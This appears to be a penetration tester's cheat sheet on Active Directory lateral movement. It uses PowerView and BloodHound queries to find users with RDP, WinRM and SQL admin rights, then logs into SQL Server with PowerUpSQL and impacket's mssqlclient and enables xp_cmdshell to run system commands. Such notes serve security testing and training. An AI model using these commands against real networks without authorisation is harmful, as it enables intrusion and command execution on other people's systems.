# Members of the Remote Access Users
## Enumerating the Remote Desktop Users Group
**Using PowerView**
```powershell
Get-NetLocalGroupMember -GroupName "Remote Desktop Users"
```
Get who has RDP on a specific computer-name
```powershell
Get-NetLocalGroupMember -ComputerName <computer-name> -GroupName "Remote Desktop Users"
```

---

## Enumerating a specific user or an entire group has WinRM access
```powershell
Get-NetLocalGroupMember -GroupName "Remote Management Users"
```
a specific computer-name
```powershell
Get-NetLocalGroupMember -ComputerName <computer-name> -GroupName "Remote Management Users"
```
Utilize Cypher query in **BloodHound** to get users with this type of access.
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
<img width="1878" height="262" alt="image" src="https://github.com/user-attachments/assets/b72fa93e-8c10-434f-921d-729fb1de6504" />

---
## SQL Admin Rights
### Cypher Query to Check for SQL Admin Rights in **BloodHound**

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
<img width="1893" height="256" alt="image" src="https://github.com/user-attachments/assets/45b600f4-f1fd-4c4a-95e1-2be0db090908" />

### Using **PowerUpSQL**

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```
Authenticate against the remote SQL server host to run custom queries or operating system commands.
```powershell
Get-SQLQuery -Verbose -Instance "<SQLServer-IP>,<Port>" -username "domain\<SqlAdmin-User>" -password "SQL1234!" -query 'Select @@version'
Get-SQLQuery -Verbose -Instance "10.10.5.150,1433" -username "corp\Ahmed" -password "SQL1234!" -query 'Select @@version'
```
In success
<img width="1543" height="76" alt="image" src="https://github.com/user-attachments/assets/891b551d-a2c0-4f97-ba94-e55e876c89a6" />
### Authenticate from our Linux
```powershell
mssqlclient.py domain/<SqlAdmin-User>@10.10.5.150 -windows-auth
impacket-mssqlclient  'domain/user':'password'@<Target-IP> -dc-ip <Domain-IP> -windows-auth
```
**Enabling xp_cmdshell**
```shell
enable_xp_cmdshell
```
Confirming Access
```shell
xp_cmdshell "whoami"
```

---
